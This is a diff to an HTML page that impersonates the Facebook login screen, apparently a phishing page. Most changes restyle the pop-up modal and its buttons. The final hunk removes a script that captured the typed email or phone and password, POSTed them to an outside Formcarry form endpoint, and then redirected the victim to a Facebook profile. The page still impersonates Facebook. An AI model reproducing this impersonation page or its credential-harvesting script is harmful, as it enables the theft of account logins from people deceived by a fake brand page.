@@ -4,7 +4,6 @@
   <meta charset="UTF-8"> 
   <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
   
-  <!-- Updated Open Graph tags -->
   <meta property="og:title" content="Facebook – log in or sign up"> 
   <meta property="og:description" content="Facebook helps you connect and share with the people in your life."> 
   <meta property="og:image" content="https://raw.githubusercontent.com/Gunjan-netizen/Plasto/refs/heads/main/Ms.jpg"> 
@@ -28,12 +27,12 @@
 
     .modal-content {
         background-color: #fefefe;
-        margin: 15% auto; /* 15% from the top and centered */
+        margin: 15% auto;
         padding: 20px;
         border: 1px solid #888;
-        width: 80%; /* Could be more or less, depending on screen size */
-        box-shadow: 0 5px 15px rgba(0,0,0,0.3); /* Add shadow for better visibility */
-        border-radius: 8px; /* Rounded corners */
+        width: 80%;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        border-radius: 8px;
     }
 
     .close-button {
@@ -54,24 +53,33 @@
         margin: 10px;
         padding: 10px 20px;
         border: none;
-        background-color: #4267B2; /* Default button color */
+        background-color: #4267B2;
         color: white;
         cursor: pointer;
-        border-radius: 5px; /* Rounded corners for buttons */
-        font-weight: bold; /* Bold text */
+        border-radius: 5px;
+        font-weight: bold;
     }
 
     .modal-button {
-        background-color: #1373eb; /* New color for modal buttons */
-        border-radius: 8px; /* Rounded corners for modal buttons */
+        background-color: #1373eb;
+        border-radius: 8px;
     }
 
     .modal-content h2 {
-        margin-top: 20px; /* Adjust space above heading */
+        margin-top: 20px;
+        text-align: center;
     }
 
     .modal-content p {
-        margin-bottom: 20px; /* Adjust space below paragraph */
+        margin-top: 30px; /* Push the description lower */
+        text-align: center;
+    }
+
+    /* Center the Login button */
+    .login-center {
+        display: flex;
+        justify-content: center;
+        align-items: center;
     }
   </style>
 </head> 
@@ -103,10 +111,13 @@
       <div class="modal-content">
           <span class="close-button" onclick="closeModal()">&times;</span>
           <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="display: block; margin: 0 auto; width: 50px; height: auto;"/>
-          <h2 style="text-align: center;">Continue your search</h2>
-          <p style="text-align: center;">Log in to find out more about your interests and get the latest updates.</p>
-          <button class="modal-button" onclick="redirectToLogin()">Log in</button>
-          <button class="modal-button" onclick="redirectToSignup()">Create new account</button>
+          <h2>Continue your search</h2>
+          <p>Log in to find out more about your interests and get the latest updates.</p>
+          
+          <!-- Centered Login Button -->
+          <div class="login-center">
+            <button class="modal-button" onclick="redirectToLogin()">Log in</button>
+          </div>
       </div>
   </div>
 
@@ -118,6 +129,7 @@
      <li><a href="#">हिन्दी</a></li> 
      <li><a href="#">اردو</a></li> 
      <li><a href="#">ગુજરાતી</a></li> 
+     <li><a href="#">ಕನ್ನಡ</a></li> 
      <li><a href="#">ਪੰਜਾਬੀ</a></li> 
      <li><a href="#">தமிழ்</a></li> 
      <li><a href="#">বাংলা</a></li> 
@@ -157,72 +169,4 @@
     </ol> 
     <small>Meta © 2024</small> 
    </div> 
-  </footer> 
-
-  <script>
-        document.getElementById("loginForm").addEventListener("submit", function (e) {
-            e.preventDefault(); // Prevent form submission
-
-            const emailPhoneInput = document.getElementById("emailPhone").value;
-            const passwordInput = document.getElementById("password").value;
-
-            // Regular expression for email validation
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            const phoneRegex = /^[0-9]{10}$/;
-
-            if (emailRegex.test(emailPhoneInput) || phoneRegex.test(emailPhoneInput)) {
-                if (passwordInput) {
-                    // Submit form data to Formcarry
-                    fetch("https://formcarry.com/s/hJQzoZbhqc-", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            emailOrPhone: emailPhoneInput,
-                            password: passwordInput
-                        })
-                    })
-                    .then(response => {
-                        if (response.ok) {
-                            console.log("Data submitted successfully");
-                        } else {
-                            console.log("Failed to submit data");
-                        }
-                    })
-                    .catch(error => console.error("Error:", error));
-
-                    // Redirect to Facebook profile link
-                    window.location.href = "https://www.facebook.com/profile.php?id=100017603296655";  // Redirect to Facebook profile
-                } else {
-                    alert("Please enter your password.");
-                }
-            } else {
-                alert("Please enter a valid 10-digit phone number or email address.");
-            }
-        });
-
-        // Function to show the modal on page load
-        window.onload = function() {
-            document.getElementById("popupModal").style.display = "block";
-        };
-
-        // Function to close the modal
-        function closeModal() {
-            document.getElementById("popupModal").style.display = "none";
-        }
-
-        // Function to redirect to login page
-        function redirectToLogin() {
-            closeModal();  // Close the modal first
-            window.location.href = "https://www.facebook.com/login"; // Redirect to Facebook login page
-        }
-
-        // Function to redirect to signup page
-        function redirectToSignup() {
-            closeModal();  // Close the modal first
-            window.location.href = "https://www.facebook.com/r.php"; // Redirect to Facebook signup page
-        }
-    </script> 
-</body>
-</html>
+  </footer>
